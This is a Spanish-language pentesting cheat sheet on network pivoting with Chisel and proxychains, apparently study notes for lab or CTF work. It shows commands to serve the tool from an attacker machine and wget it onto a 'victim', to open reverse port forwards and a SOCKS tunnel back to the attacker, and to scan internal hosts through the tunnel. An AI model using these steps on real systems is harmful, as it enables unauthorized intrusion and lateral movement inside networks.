# Pivoting con Chisel 

Tags: #Chisel #PortForwarding #LocalForwarding #DinamicForwarding #Pivoting 

## Local Port Forwarding 

Nos permite redirigir todo el trafico entrante de un puerto local hacia un puerto remoto.

* **Server -> Windows** 
* **Cliente -> Kali**

#### Forma 1 de descarga
Ingresamos a la pagina para descargarnos 'Chisel'
```python 
❯ https://github.com/jpillora/chisel > Releases > 'chisel_1.9.1_linux_amd64.gz' 
❯ gunzip chisel.gz
❯ chmod +x chisel
```

#### Forma 2 de descarga

1. Podemos clonarlo a nuestra maquina victima 
```bash
❯ git clone https://github.com/jpillora/chisel       # Nos descargamos el Chisel
```

Dentro de Chisel 
```bash
❯ go build -ldflags “-s -w” .                        # Nos ayudara a reducir el tamaño del compilado 
❯ upx Chisel                                         # Para reducir aun mas el tamaño
```

2. Debemos transferirlo a la maquina victima mediante un servidor HTTP 
```bash 
❯ python3 -m http.server 80    # Maquina de atacante 
❯ wget http://IP/chisel        # Maquina victima 
```

#### Forma de ejecutar el Chisel 

* De esta manera nos podemos traer un puerto especifico
```bash
❯ ./chisel server --reverse -p 1234                                                 # Server 'Maquina de atacante'
❯ ./chisel client <IP-Server>:1234 R:<Port-Local-a-Abrir>:<IP-Local>:<Port-Traemos> # Cliente 'Maquina victima'

	# R = Remote Port Forwarding
	# IP-Server = IP de la maquina atacante
	# Port-Server = Puerto de la maquina atacante
	# Port-Local = Puerto que vamos a traer de la maquina victima
	# IP-Local = IP del Localhost de la maquina victima 
	# Port-Traemos = Puerto que vamos a abrir en nuestra maquina
```

* De esta manera nos crea un túnel desde la maquina de atacante hacia la maquina victima
```bash
❯ ./chisel server --reverse -p 1234                                             # Server 'Maquina de atacante'
❯ ./chisel client <IP-Server>:1234 R:socks                                      # Cliente 'Maquina victima'

	# R = Remote Port Forwarding
	# IP-Server = IP de la maquina atacante
	# Port-Server = Puerto de la maquina atacante
     # socks = Abre el puerto 1080 de nuestra de atacante y nos crea un tunel para llegar a la maquina victima 
```

Debemos de hacer los siguientes cambios después de crear el túnel 
```bash 
❯ nvim /etc/proxychains.conf 

# Comentamos el Dinamic_chain, este solo se habilita cuando vamos pasando por varios tuneles
# Activamos el strick_chain, este solo es cuando tenemos un tunel 
# Hasta abajo del archivo agregamos lo siguiente:

sock5 127.0.0.1 1080 
```

### Comandos con Proxychain

Forma de verificar y de como debemos de ir colocando los comandos en nuestra maquina de atacante.
* Siempre debemos de usar **'proxychains'** antes de cada comando
```bash 
# NMAP
❯ seq 1 65535 | xargs -P 500 -I {} proxychains nmap -sT -Pn -p{} -open -T5 -v -n ❮Target IP❯ 2>&1 | grep "tcp open"      # Proxychains nos ayudara que el comando pase por el tunel creado por chisel 
	# P = Tareas en paralelo
❯ proxychains nmap --top-ports 500 --open -T5 -v -n <IP> -sT -Pn -oG allports 2>&1 | grep -vE "timeout|OK"
❯ proxychains nmap -sT -Pn -sCV -p22,.. <IP> -oN Targeted

# WHATWEB
❯ proxychains whatweb ❮Target IP❯     # Escaneo con whatweb a la maquina victima 
```

## Dinamic Port Forwarding 

Modificaremos:
```bash
❯ nvim /etc/proxychains.conf                            # Modificaremo este archivo en nuestra maquina
	socks4 127.0.0.1 1080                              # Haremos que la conexion para nuestra maquina se efectue en el puerto 1080
```

```bash
❯ ssh < user>@< IP> -D 1080                             # Para conectarnos por ssh (D=Dinamic Port Forwarding) y colocamos el puerto que anteriormente habiamos configurado.
❯ proxychains vncviewer -passwd secret 127.0.0.1:5901   # Nos conectamos por vncviewer y nos arrojara el cuadro remoto de la conexion (5901=puerto remoto expuesto en la maquina victima)

	# secret -> Archivo que contiene la passwd para la conexion
```